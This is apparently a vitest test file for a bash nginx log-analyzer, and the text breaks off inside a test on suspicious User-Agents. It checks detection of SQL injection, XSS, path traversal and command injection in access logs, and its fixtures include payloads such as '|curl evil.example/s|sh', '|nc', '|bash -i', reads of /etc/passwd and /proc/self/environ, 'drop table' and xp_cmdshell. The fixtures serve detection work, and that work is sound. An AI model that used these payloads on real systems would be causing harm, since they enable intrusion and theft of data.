import { spawnSync } from 'node:child_process';
import { readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { install, runFile, sandbox, scriptsDir, type Sandbox } from '../helpers/shell-sandbox.ts';

// These tests run the real log-analyzer.sh against an nginx access log written into a scratch directory.
// The script is installed the way the deploy installs it, with its /var/log/ paths and its quoted /tmp/
// paths redirected into the sandbox, the final `find /tmp` cleanup pointed at the sandbox by runAnalyzer(), and
// the log files it analyses pointed at the sandbox through its environment variables. One hard-coded path is
// not redirected: /root/murphys-laws/logs/api-error.log, which only feeds the "APPLICATION ERRORS" section
// and none of the sections these tests read.
//
// "Today" is pinned: the script is run with LOG_ANALYZER_DATE=TEST_DAY, so the tests neither race midnight
// nor depend on the day they run. The dates around it are chosen to be hard
// for a loose date match: yesterday is 29 February (a leap day), and the same day number exists in the month
// and the year before.

const TEST_DAY = '01/Mar/2028';
const YESTERDAY = '29/Feb/2028';
const LAST_MONTH = '01/Feb/2028';
const LAST_YEAR = '01/Mar/2027';

// The JSON report needs jq. The sandbox PATH is only its own bin plus /usr/bin:/bin, so jq's own directory
// (Homebrew's, on a Mac) is added; the JSON tests are skipped where jq is not installed (it is on CI).
const jqDir = spawnSync('bash', ['-c', 'dirname "$(command -v jq)"'], { encoding: 'utf8' }).stdout.trim();
const hasJq = jqDir !== '' && jqDir !== '.';

interface Run {
  stdout: string;
  /** The report's top summary, which lists every attack category that was counted. */
  summary: string;
  section: (title: string, next: string) => string;
}

/**
 * Runs the script against the given access log lines (`null` leaves the log file missing). The script's
 * stderr must stay empty: the scans run without `2>/dev/null`, so a grep that warns about a pattern, as
 * GNU grep 3.8 and later does about a stray backslash, would be mailed from cron.
 */
function runAnalyzer(box: Sandbox, lines: string[] | null, args: string[] = []): Run {
  const accessLog = path.join(box.root, 'access.log');
  if (lines !== null) {
    writeFileSync(accessLog, lines.length > 0 ? `${lines.join('\n')}\n` : '');
  }
  // The script's last step prunes old reports with an unquoted `find /tmp ...`, which install() leaves
  // alone. Point it at the sandbox so a test never deletes anything under the real /tmp.
  const original = readFileSync(path.join(scriptsDir, 'log-analyzer.sh'), 'utf8');
  expect(original).toContain('find /tmp ');
  const script = install(box, 'log-analyzer.sh', original.replace('find /tmp ', `find ${box.root} `), {
    withHelper: false,
  });
  const result = runFile(script, args, box, {
    PATH: `${box.bin}:${hasJq ? `${jqDir}:` : ''}/usr/bin:/bin`,
    LOG_ANALYZER_DATE: TEST_DAY,
    NGINX_ACCESS_LOG: accessLog,
    NGINX_ERROR_LOG: path.join(box.root, 'missing-error.log'),
    AUTH_LOG: path.join(box.root, 'missing-auth.log'),
    SYSLOG: path.join(box.root, 'missing-syslog'),
    LOG_ANALYZER_LOG: path.join(box.root, 'log-analyzer.log'),
  });
  expect(result.status, result.stderr).toBe(0);
  expect(result.stderr).toBe('');
  const { stdout } = result;
  const summaryEnd = stdout.indexOf('NGINX ACCESS LOG ANALYSIS');
  return {
    stdout,
    summary: args.includes('json') ? '' : stdout.slice(0, summaryEnd),
    section(title, next) {
      const start = stdout.indexOf(title);
      const end = stdout.indexOf(next);
      expect(start).toBeGreaterThan(-1);
      expect(end).toBeGreaterThan(start);
      return stdout.slice(start, end);
    },
  };
}

const sqlSection = (run: Run) => run.section('SQL INJECTION ATTEMPTS', 'CROSS-SITE SCRIPTING');
const xssSection = (run: Run) => run.section('CROSS-SITE SCRIPTING', 'PATH TRAVERSAL ATTEMPTS');
const traversalSection = (run: Run) => run.section('PATH TRAVERSAL ATTEMPTS', 'COMMAND INJECTION ATTEMPTS');
const commandSection = (run: Run) => run.section('COMMAND INJECTION ATTEMPTS', 'BRUTE FORCE ATTEMPTS');

/** A summary line with nothing after its number, so `1` does not also match `10`. */
const totalAttacks = (count: number) => `Total attack attempts: ${count}\n`;
const totalRequests = (count: number) => `Total requests today: ${count}\n`;

interface LineOptions {
  userAgent?: string;
  referrer?: string;
  ip?: string;
  /** The date in nginx form; defaults to today. */
  date?: string;
  /** The HTTP status nginx answered with; defaults to 200. */
  status?: number;
}

const nginxLine = (request: string, { userAgent = 'Mozilla/5.0', referrer = '-', ip = '203.0.113.7', date = TEST_DAY, status = 200 }: LineOptions = {}) =>
  `${ip} - - [${date}:00:00:06 +0000] "GET ${request} HTTP/1.1" ${status} 4708 "${referrer}" "${userAgent}"`;

/** What the text report prints for a line: the first 120 characters. */
const printed = (line: string) => line.slice(0, 120);

/** The sample lines of a section (each is indented by two spaces and starts with the client IP). */
const sampleLines = (section: string, ip = '203.0.113.7') => section.match(new RegExp(`^ {2}${ip.replaceAll('.', '\\.')} .*$`, 'gm')) ?? [];

// Ordinary requests modelled on the 9 November report, which was counted as 28,131 command injection
// attempts (re-dated to the pinned day). The `&cat=5` and `;cat=5` lines are the ones that guard the
// separator rule after `&` and `;`.
const ORDINARY_TRAFFIC = [
  nginxLine('/law/725', { userAgent: 'mwmbl/1.1.2 (https://github.com/mwmbl/mwmbl/ contact mwmbl@me.stone-red.net)' }),
  nginxLine('/', { userAgent: 'SentryUptimeBot/1.0 (+http://docs.sentry.io/product/alerts/uptime-monitoring/)' }),
  nginxLine('/api/v1/laws?limit=25&offset=0&sort=score&order=desc&category_id=23'),
  nginxLine('/api/v1/laws?cat=5&limit=25'),
  nginxLine('/api/v1/laws?limit=25&cat=5&sort=score'),
  nginxLine('/api/v1/laws?limit=25;cat=5'),
  nginxLine('/search?q=cat+and+shell&sort=score'),
  // `; CAT ` in a User-Agent must not look like `;cat`.
  nginxLine('/law/41', { userAgent: 'Mozilla/5.0 (Linux; Android 11; CAT S62 Pro) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36' }),
];

describe('log-analyzer.sh command injection detection', () => {
  it('reports nothing for ordinary traffic', () => {
    const report = runAnalyzer(sandbox(), ORDINARY_TRAFFIC);
    expect(commandSection(report)).toContain('No command injection attempts detected');
    expect(report.summary).toContain('No security issues detected in logs');
  });

  it('does not count a clean log once per pattern', () => {
    // Before the fix a pattern that began with an unescaped `|` matched every line, so the count was roughly
    // the number of requests multiplied by the number of such patterns. That only happens under GNU grep (CI
    // and the server); BSD grep on macOS rejects the pattern and counts 0, so locally this case passes against
    // the old script too. The `&category_id=` line in the ordinary-traffic test fails the old script on both.
    const report = runAnalyzer(sandbox(), Array.from({ length: 50 }, (_, i) => nginxLine(`/law/${i}`)));
    expect(commandSection(report)).toContain('No command injection attempts detected');
  });

  it.each([
    ['a piped cat', '/x?a=1|cat /etc/passwd'],
    ['a piped cat in capitals', '/x?a=1%7CCAT%20/etc/passwd'],
    ['a URL-encoded pipe', '/x?a=1%7Ccat%20/etc/passwd'],
    ['a pipe into sh', '/x?c=curl+evil.example/s|sh'],
    ['a piped nc', '/x?a=1|nc 203.0.113.9 4444'],
    ['a piped wget', '/x?a=1|wget http://203.0.113.9/a'],
    ['a piped curl', '/x?a=1|curl http://203.0.113.9/a'],
    ['a piped bash', '/x?a=1|bash -i'],
    ['an ampersand cat', '/x?a=1&cat%20/etc/hosts'],
    ['a semicolon cat', '/x?a=1;cat%20/etc/hosts'],
    ['a backtick cat', '/x?a=`cat /etc/hosts`'],
    ['a subshell cat', '/x?a=$(cat /etc/hosts)'],
    ['an encoded ampersand cat', '/x?a=1%26cat%20/etc/hosts'],
    ['an encoded semicolon cat', '/x?a=1%3Bcat%20/etc/hosts'],
    ['an encoded backtick cat', '/x?a=%60cat%20/etc/hosts%60'],
    ['an encoded subshell cat', '/x?a=%24%28cat%20/etc/hosts%29'],
    ['a semicolon cat with input redirection', '/x?a=1;cat</proc/self/environ'],
    ['a semicolon cat with an encoded redirection', '/x?a=1;cat%3C/proc/self/environ'],
    ['an ampersand cat with input redirection', '/x?a=1&cat</etc/passwd'],
    ['a semicolon cat separated by ${IFS}', '/x?a=1;cat${IFS}/etc/passwd'],
    ['a semicolon cat separated by a tab', '/x?a=1;cat%09/etc/passwd'],
    ['a pipe followed by plus-encoded spaces', '/x?a=1|+cat+/etc/passwd'],
    ['an encoded semicolon followed by plus-encoded spaces', '/x?a=1%3B+cat%20/etc/passwd'],
  ])('flags %s', (_name, request) => {
    const report = runAnalyzer(sandbox(), [...ORDINARY_TRAFFIC, nginxLine(request)]);
    // Every request below matches exactly one pattern, so the count is exactly one and the sample list holds
    // exactly one line.
    expect(commandSection(report)).toContain('Detected 1 potential command injection attempts');
    expect(commandSection(report)).toContain(printed(nginxLine(request)));
    expect(sampleLines(commandSection(report))).toHaveLength(1);
    expect(report.summary).toContain('Command Injection: 1 attempts');
  });

  it.each([
    ['a pipe and curl in the User-Agent', { userAgent: 'Mozilla/5.0 |curl http://example.test' }],
    ['a pipe and sh in the referrer', { referrer: 'https://example.test/?a=1|sh' }],
    ['a backtick cat in the User-Agent', { userAgent: 'Mozilla/5.0 `cat` tool' }],
    ['a semicolon cat in the referrer', { referrer: 'https://example.test/?a=1;cat%20/etc/hosts' }],
  ])('looks only at the request, not %s', (_name, options) => {
    const report = runAnalyzer(sandbox(), [nginxLine('/law/725', options)]);
    expect(commandSection(report)).toContain('No command injection attempts detected');
  });
});

describe('log-analyzer.sh security scans cover only today', () => {
  const OTHER_DAYS = [
    nginxLine("/x?id=1' union select 1,2 from t where 1=1--", { ip: '198.51.100.1', date: YESTERDAY }),
    nginxLine('/x?q=<script>alert(1)</script>', { ip: '198.51.100.2', date: YESTERDAY }),
    nginxLine('/x/../../etc/passwd', { ip: '198.51.100.3', date: YESTERDAY }),
    nginxLine('/x?a=1|cat /etc/hosts', { ip: '198.51.100.4', date: YESTERDAY }),
    nginxLine("/x?id=1' union select 1", { ip: '198.51.100.5', date: LAST_YEAR }),
    nginxLine("/x?id=1' union select 1", { ip: '198.51.100.6', date: LAST_MONTH }),
  ];

  it('reports no attacks when they are all from other days', () => {
    const report = runAnalyzer(sandbox(), [...ORDINARY_TRAFFIC, ...OTHER_DAYS]);
    expect(sqlSection(report)).toContain('No SQL injection attempts detected');
    expect(xssSection(report)).toContain('No XSS attempts detected');
    expect(traversalSection(report)).toContain('No path traversal attempts detected');
    expect(commandSection(report)).toContain('No command injection attempts detected');
    expect(report.summary).toContain('No security issues detected in logs');
    expect(report.summary).toContain(totalRequests(ORDINARY_TRAFFIC.length));
  });

  it("counts only today's attacks, and only today's attackers, when the log holds several days", () => {
    const today = nginxLine("/x?id=1' union select 1", { ip: '192.0.2.50' });
    const report = runAnalyzer(sandbox(), [...OTHER_DAYS, ...ORDINARY_TRAFFIC, today]);
    const section = sqlSection(report);
    expect(section).toContain('Detected 1 potential SQL injection attempts');
    expect(section).toContain('192.0.2.50: 1 attempts');
    expect(section).not.toContain('198.51.100');
    expect(report.summary).toContain(totalAttacks(1));
  });

  it("is not fooled by today's date appearing in another day's referrer", () => {
    const line = nginxLine("/x?id=1' union select 1", { referrer: `https://example.test/?d=${TEST_DAY}`, date: YESTERDAY });
    const report = runAnalyzer(sandbox(), [line]);
    expect(sqlSection(report)).toContain('No SQL injection attempts detected');
  });

  it.runIf(hasJq)('limits the JSON securityFindings and summary to today as well', () => {
    const today = nginxLine('/x?a=1|cat /etc/hosts', { ip: '192.0.2.60' });
    const report = runAnalyzer(sandbox(), [...OTHER_DAYS, ...ORDINARY_TRAFFIC, today], ['--format', 'json']);
    const json = JSON.parse(report.stdout);
    expect(json.summary.totalAttackAttempts).toBe(1);
    expect(json.summary.totalRequests).toBe(ORDINARY_TRAFFIC.length + 1);
    expect(json.summary.attackLines).toEqual(['Command Injection: 1 attempts']);
    expect(json.securityFindings).toEqual([{ category: 'Command Injection', count: 1, samples: [today], served: 1, servedSamples: [today] }]);
  });

  it.runIf(hasJq)('reports a clean JSON summary when every attack is from another day', () => {
    const json = JSON.parse(runAnalyzer(sandbox(), [...ORDINARY_TRAFFIC, ...OTHER_DAYS], ['--format', 'json']).stdout);
    expect(json.summary.totalAttackAttempts).toBe(0);
    expect(json.summary.attackLines).toEqual(['No security issues detected in logs']);
    expect(json.securityFindings).toEqual([]);
  });

  it('reports no issues, and zero requests, when the access log is missing', () => {
    const report = runAnalyzer(sandbox(), null);
    expect(report.stdout).toContain('Nginx access log not found');
    expect(report.summary).toContain('No security issues detected in logs');
    expect(report.summary).toContain(totalRequests(0));
  });

  it('reports no issues when the access log is empty', () => {
    const report = runAnalyzer(sandbox(), []);
    expect(report.summary).toContain('No security issues detected in logs');
    expect(report.summary).toContain(totalRequests(0));
  });

  it.runIf(hasJq)('emits a clean JSON report for a missing and for an empty access log', () => {
    for (const lines of [null, []]) {
      const json = JSON.parse(runAnalyzer(sandbox(), lines, ['--format', 'json']).stdout);
      expect(json.summary.totalAttackAttempts).toBe(0);
      expect(json.securityFindings).toEqual([]);
    }
  });
});

describe('log-analyzer.sh counts each request once', () => {
  // Matches the union/select, select/from/where and `or 1=1` patterns at once.
  const MANY_PATTERNS = nginxLine("/x?id=1' or 1=1 union select a from b where c=1");

  it('counts a line that matches several patterns of one category once', () => {
    const report = runAnalyzer(sandbox(), [MANY_PATTERNS, ...ORDINARY_TRAFFIC]);
    expect(sqlSection(report)).toContain('Detected 1 potential SQL injection attempts');
    expect(report.summary).toContain('SQL Injection: 1 attempts');
    expect(report.summary).toContain(totalAttacks(1));
    expect(report.summary).not.toContain('counted once');
    expect(sqlSection(report)).toContain('203.0.113.7: 1 attempts');
  });

  it('counts a path traversal that matches both of its patterns once', () => {
    const report = runAnalyzer(sandbox(), [nginxLine('/x?f=../../etc/passwd'), ...ORDINARY_TRAFFIC]);
    expect(traversalSection(report)).toContain('Detected 1 potential path traversal attempts');
    expect(report.summary).toContain(totalAttacks(1));
    expect(report.summary).not.toContain('counted once');
  });

  it('prints each matching line once in the samples', () => {
    const report = runAnalyzer(sandbox(), [MANY_PATTERNS]);
    expect(sampleLines(sqlSection(report))).toEqual([`  ${printed(MANY_PATTERNS)}...`]);
  });

  it('counts a request that matches two categories once in the total but in both categories', () => {
    const both = nginxLine('/x?f=../../etc/passwd|cat /etc/hosts');
    const report = runAnalyzer(sandbox(), [both, ...ORDINARY_TRAFFIC]);
    expect(traversalSection(report)).toContain('Detected 1 potential path traversal attempts');
    expect(commandSection(report)).toContain('Detected 1 potential command injection attempts');
    expect(report.summary).toContain('Path Traversal: 1 attempts');
    expect(report.summary).toContain('Command Injection: 1 attempts');
    expect(report.summary).toContain(totalAttacks(1));
    expect(report.summary).toContain('counted once in the total');
  });

  it('adds up requests that match different categories', () => {
    const report = runAnalyzer(sandbox(), [
      nginxLine("/x?id=1' union select 1"),
      nginxLine('/x?q=<script>alert(1)</script>'),
      nginxLine('/x?a=1|cat /etc/hosts'),
      ...ORDINARY_TRAFFIC,
    ]);
    expect(report.summary).toContain(totalAttacks(3));
    expect(report.summary).not.toContain('counted once in the total');
  });

  it('lists attacking IPs by their number of requests, each request once', () => {
    const report = runAnalyzer(sandbox(), [
      nginxLine("/x?id=1' union select 1", { ip: '192.0.2.1' }),
      nginxLine("/x?id=2' union select 2 from t where 1=1", { ip: '192.0.2.1' }),
      nginxLine("/x?id=3' union select 3", { ip: '192.0.2.2' }),
    ]);
    const section = sqlSection(report);
    expect(section).toContain('Detected 3 potential SQL injection attempts');
    expect(section.indexOf('192.0.2.1: 2 attempts')).toBeGreaterThan(-1);
    expect(section.indexOf('192.0.2.2: 1 attempts')).toBeGreaterThan(section.indexOf('192.0.2.1: 2 attempts'));
  });

  it('prints at most five sample lines, the first five, in order', () => {
    const attacks = Array.from({ length: 8 }, (_, i) => nginxLine(`/x?id=${i}' union select ${i}`));
    const report = runAnalyzer(sandbox(), attacks);
    expect(sqlSection(report)).toContain('Detected 8 potential SQL injection attempts');
    expect(sampleLines(sqlSection(report))).toEqual(attacks.slice(0, 5).map((line) => `  ${printed(line)}...`));
  });

  it.runIf(hasJq)('keeps the JSON counts in step with the text report', () => {
    const both = nginxLine('/x?f=../../etc/passwd|cat /etc/hosts');
    const json = JSON.parse(runAnalyzer(sandbox(), [both, ...ORDINARY_TRAFFIC], ['--format', 'json']).stdout);
    expect(json.summary.totalAttackAttempts).toBe(1);
    expect(json.securityFindings.map((finding: { category: string; count: number }) => [finding.category, finding.count])).toEqual([
      ['Path Traversal', 1],
      ['Command Injection', 1],
    ]);
    for (const finding of json.securityFindings) {
      expect(finding.samples).toEqual([both]);
    }
  });

  it.runIf(hasJq)('names every category in the JSON findings', () => {
    const lines = [nginxLine("/x?id=1' union select 1"), nginxLine('/x?q=<script>alert(1)</script>')];
    const json = JSON.parse(runAnalyzer(sandbox(), lines, ['--format', 'json']).stdout);
    expect(json.securityFindings.map((finding: { category: string }) => finding.category)).toEqual([
      'SQL Injection',
      'Cross-Site Scripting (XSS)',
    ]);
    expect(json.summary.attackLines).toEqual(['SQL Injection: 1 attempts', 'XSS: 1 attempts']);
  });

  it.runIf(hasJq)('caps the JSON samples without repeating a line', () => {
    const attacks = Array.from({ length: 8 }, (_, i) => nginxLine(`/x?id=${i}' union select ${i}`));
    const json = JSON.parse(runAnalyzer(sandbox(), attacks, ['--format', 'json']).stdout);
    expect(json.securityFindings[0].count).toBe(8);
    expect(json.securityFindings[0].samples).toEqual(attacks.slice(0, 5));
  });
});

describe('log-analyzer.sh SQL injection detection', () => {
  // Ordinary requests. The keywords in the User-Agent and referrer lines, `update settings`, `order+1=1` and
  // `color+1=1` tripped the old or the first rewritten patterns; the rest are controls.
  const BENIGN = [
    ['the site API call', nginxLine('/api/v1/laws?limit=25&offset=0&sort=score&order=desc&category_id=23')],
    ['a law page', nginxLine('/law/725')],
    ['a category page', nginxLine('/category/computers-and-technology')],
    ['a search for "update settings"', nginxLine('/search?q=update settings')],
    ['a search for "update settings" encoded', nginxLine('/api/v1/laws?q=update%20settings&sort=score')],
    ['a search with select and from', nginxLine('/search?q=select+a+law+from+the+list')],
    ['a slug with a double hyphen', nginxLine('/law/murphys--second-law')],
    ['a double hyphen in the query', nginxLine('/search?q=a--b&sort=score')],
    ['a quote inside a word and a double hyphen', nginxLine("/search?q=murphy's--law")],
    ['the word order next to a number', nginxLine('/api/v1/laws?q=order+1=1')],
    ['a word ending in or, next to a number', nginxLine('/search?q=color+1=1')],
    ['a word ending in and, next to a number', nginxLine('/search?q=brand+2=2')],
    ['update and set in the User-Agent', nginxLine('/', { userAgent: 'Mozilla/5.0 (X11) Updater/1.0 update the set of tools' })],
    ['delete and from in the User-Agent', nginxLine('/', { userAgent: 'CleanupBot/2.0 (delete files from the cache)' })],
    ['delete and from in the referrer', nginxLine('/', { referrer: 'https://example.test/how-to-delete-from-where-it-lives' })],
    ['select, from and where in the referrer', nginxLine('/', { referrer: 'https://example.test/?q=select+a+from+b+where+c' })],
    ['union and select in the referrer', nginxLine('/', { referrer: 'https://example.test/union+select' })],
    ['a double hyphen in the User-Agent', nginxLine('/', { userAgent: 'Mozilla/5.0 -- build--42' })],
    ['or 1=1 in the User-Agent', nginxLine('/', { userAgent: 'curl/8.0 or 1=1' })],
    ['insert into in the User-Agent', nginxLine('/', { userAgent: 'Plugin insert into values select' })],
    ['drop table in the referrer', nginxLine('/', { referrer: 'https://example.test/drop+table' })],
  ] as const;

  it.each(BENIGN)('does not flag %s', (_name, line) => {
    const report = runAnalyzer(sandbox(), [line]);
    expect(sqlSection(report)).toContain('No SQL injection attempts detected');
    expect(report.summary).not.toContain('SQL Injection');
  });

  it.each([
    ['union select', '/x?id=1+union+select+1,2'],
    ['union all select, encoded', '/x?id=1%20UNION%20ALL%20SELECT%20null'],
    ['union select with comment gaps', '/x?id=1/**/union/**/select/**/1'],
    ['union select across an encoded line break', '/x?id=1%20UNION%0Aselect%201'],
    ['union select across an encoded tab', '/x?id=1%20union%09select%201'],
    ['union with a bracketed select', '/x?id=1%20union%28select%201%29'],
    ['a quote, or 1=1 and a comment', "/x?q=' or 1=1--"],
    ['an encoded quote and or 1=1', '/x?q=%27%20or%201=1'],
    ['or 1=1 with spaces around the equals sign', '/x?id=1%20or%201%20=%201'],
    ['a bracketed tautology and a comment', '/x?id=1)%20or%20(1=1)--'],
    ["or '1'='1", "/x?id=1' or '1'='1"],
    ["or ''='", "/x?id=1%27%20or%20%27%27=%27"],
    ['and 1=1', '/x?id=1%20and%201=1'],
    ['a quote and a comment', "/x?user=admin'--"],
    ['a quote and a spaced comment', "/x?user=admin' --"],
    ['a quote, semicolon and comment', "/x?q=x';--"],
    ['a quote and an encoded comment', '/x?user=admin%27%2D%2D'],
    ['a closing bracket and a comment', '/x?id=1)--'],
    ['a closing bracket, semicolon and comment', '/x?id=1);--'],
    ['a semicolon and a comment', '/x?id=1;--'],
    ['drop table', '/x?q=1;drop table users'],
    ['an encoded drop table', '/x?q=1%3BDROP%20TABLE%20users'],
    ['drop table across an encoded tab', '/x?q=1;drop%09table%20users'],
    ['xp_cmdshell', "/x?q=exec xp_cmdshell 'dir'"],
    ['exec master..xp_', "/x?q=1';exec master..xp_regread"],
    ['select from where', '/x?q=select * from users where id=1'],
    ['a stacked delete', '/x?q=1;delete from users'],
    ['a stacked insert', '/x?q=1;insert into users values(1)'],
    ['a stacked update', '/x?q=1;update users set a=1'],
    ['delete from where', '/x?q=delete from users where 1'],
    ['insert into values', '/x?q=insert into users values(1)'],
    ['update set', '/x?q=update users set admin=1'],
    ['update set with an encoded space before the equals sign', '/x?q=update%20users%20set%20admin%20=%201'],
    ['update set with a plus-encoded space before an encoded equals sign', '/x?q=update+users+set+admin+%3D+1'],
  ])('flags %s', (_name, request) => {
    const report = runAnalyzer(sandbox(), [...ORDINARY_TRAFFIC, nginxLine(request)]);
    expect(sqlSection(report)).toContain('Detected 1 potential SQL injection attempts');
    expect(sqlSection(report)).toContain(printed(nginxLine(request)));
    expect(report.summary).toContain('SQL Injection: 1 attempts');
  });
});

describe('log-analyzer.sh XSS and path traversal detection', () => {
  it.each([
    ['onload= in the User-Agent', { userAgent: 'Mozilla/5.0 onload=init' }],
    ['onclick= in the User-Agent', { userAgent: 'Mozilla/5.0 onclick=handler' }],
    ['onerror= in the referrer', { referrer: 'https://example.test/?onerror=1' }],
    ['eval( in the User-Agent', { userAgent: 'Mozilla/5.0 eval(x)' }],
    ['javascript: in the referrer', { referrer: 'https://example.test/javascript:void' }],
    ['document.cookie in the User-Agent', { userAgent: 'Mozilla/5.0 document.cookie' }],
    ['<script in the User-Agent', { userAgent: '<script>x</script>' }],
  ])('does not flag %s', (_name, options) => {
    const report = runAnalyzer(sandbox(), [nginxLine('/law/725', options)]);
    expect(xssSection(report)).toContain('No XSS attempts detected');
  });

  it('does not flag a document-cookie lookalike, since the dot is literal', () => {
    const report = runAnalyzer(sandbox(), [nginxLine('/search?q=documentXcookie')]);
    expect(xssSection(report)).toContain('No XSS attempts detected');
  });

  it.each([
    ['a script tag', '/x?q=<script>alert(1)</script>'],
    ['an onerror handler', '/x?q=<img src=x onerror=alert(1)>'],
    ['an onload handler', '/x?q=<body onload=alert(1)>'],
    ['an onclick handler', '/x?q=<a onclick=alert(1)>'],
    ['an iframe', '/x?q=<iframe src=//e.test>'],
    ['a javascript: URL', '/x?u=javascript:alert(1)'],
    ['document.cookie', '/x?q=document.cookie'],
    ['eval(', '/x?q=eval(atob(1))'],
  ])('flags %s in the request', (_name, request) => {
    const report = runAnalyzer(sandbox(), [...ORDINARY_TRAFFIC, nginxLine(request)]);
    expect(xssSection(report)).toContain('Detected 1 potential XSS attempts');
    expect(xssSection(report)).toContain(printed(nginxLine(request)));
  });

  it.each([
    ['a ../ in the referrer', { referrer: 'https://example.test/a/../b' }],
    ['etc/passwd in the referrer', { referrer: 'https://example.test/etc/passwd' }],
    ['win.ini in the User-Agent', { userAgent: 'Mozilla/5.0 win.ini' }],
  ])('does not flag %s', (_name, options) => {
    const report = runAnalyzer(sandbox(), [nginxLine('/law/725', options)]);
    expect(traversalSection(report)).toContain('No path traversal attempts detected');
  });

  it.each([
    ['a dot-dot-slash', '/x/../../secret'],
    ['an encoded slash', '/x/..%2F..%2Fsecret'],
    ['an encoded backslash', '/x/..%5C..%5Csecret'],
    ['a double-encoded dot', '/x/%2e%2e/secret'],
    ['etc/passwd', '/x?f=etc/passwd'],
    ['etc/shadow', '/x?f=etc/shadow'],
    ['boot.ini', '/x?f=boot.ini'],
    ['win.ini', '/x?f=win.ini'],
  ])('flags %s in the request', (_name, request) => {
    const report = runAnalyzer(sandbox(), [...ORDINARY_TRAFFIC, nginxLine(request)]);
    expect(traversalSection(report)).toContain('Detected 1 potential path traversal attempts');
    expect(traversalSection(report)).toContain(printed(nginxLine(request)));
  });
});

describe('log-analyzer.sh suspicious User-Agents', () => {
  // One realistic User-Agent per KNOWN_BOT_REGEX entry. Each carries `bot`, `crawler` or `spider` (in its name,
  // its info URL or, for PublisherRadar, `robots.txt`), as the real one does, so the generic filter would list it without the exclusion.
  const KNOWN_BOTS: Record<string, string> = {
    applebot: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)',
    googlebot: 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) Chrome/157.0.8103.78 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    bingbot: 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36',
    duckduckbot: 'DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)',
    yandexbot: 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    baiduspider: 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
    gptbot: 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.4; +https://openai.com/gptbot)',
    'oai-searchbot': 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; OAI-SearchBot/1.0; +https://openai.com/searchbot',
    'chatgpt-user': 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot',
    claudebot: 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)',
    perplexitybot: 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; PerplexityBot/1.0; +https://perplexity.ai/perplexitybot)',
    'meta-externalagent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/145.0.0.0 Safari/537.36 (compatible; meta-externalagent/1.1 (+https://developers.facebook.com/docs/sharing/webmasters/crawler))',
    'meta-externalfetcher': 'meta-externalfetcher/1.1 (+https://developers.facebook.com/docs/sharing/webmasters/crawler)',
    amazonbot: 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot) Chrome/119.0.6045.214 Safari/537.36',
    petalbot: 'Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (HTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)',
    mj12bot: 'Mozilla/5.0 (compatible; MJ12bot/v2.0.7; http://mj12bot.com/)',
    ahrefsbot: 'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
    semrushbot: 'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
    dotbot: 'Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)',
    sentryuptimebot: 'SentryUptimeBot/1.0 (+http://docs.sentry.io/product/alerts/uptime-monitoring/)',
    uptimerobot: 'Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)',
    bytespider: 'Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; spider-feedback@bytedance.com)',
    'sogou web spider': 'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
    generalretrievalbot: 'GeneralRetrievalBot/1.0 (+https://generalretrieval.com/bot; crawler@generalretrieval.com; AxionOrbital Space Inc.; search index for AI-agent search)',
    kamatabot: 'Mozilla/5.0 (compatible; KamataBot/1.0; +https://api.kamata.ai/bot)',
    keenablebot: 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; KeenableBot/1.0; +https://keenable.ai/bot)',
    exasearchbot: 'Mozilla/5.0 (compatible; ExaSearchBot/1.0; +https://crawler.exa.ai/)',
    mcpcensus: 'MCPCensus/0.1.0 (+https://www.radixia.ai/census/crawler; census research; opt-out: census@radixia.ai)',
    publisherradar: 'PublisherRadar/1.0 (+public-web research; respects robots.txt)',
    'remotejobsiq-bot': 'remotejobsiq-bot/0.1 (+https://remotejobsiq.com)',
    findisebot: 'Findisebot/1.0 (+https://findise.net)',
  };
  // Hostile or unrecognised agents that must stay in the report, one request each.
  const UNKNOWN = [
    'EvilScraperBot/3.0',
    'nikto/2.5.0',
    'sqlmap/1.7',
    'havij/1.17',
    'Acunetix-Product',
    'Mozilla/5.0 (compatible; PortScanner/1.0)',
    'Mozilla/5.0 (compatible; SomeNewCrawler/1.0)',
  ];

  const agentRows = (run: Run) => {
    const start = run.stdout.indexOf('Suspicious User Agents:');
    expect(start).toBeGreaterThan(-1);
    const end = run.stdout.indexOf('━', start);
    expect(end).toBeGreaterThan(start);
    return run.stdout.slice(start, end).match(/^ {2}\d+ - .*$/gm) ?? [];
  };
  const requests = (agents: string[]) => agents.map((userAgent) => nginxLine('/', { userAgent }));

  it('lists every KNOWN_BOT_REGEX entry in this table, and no other', () => {
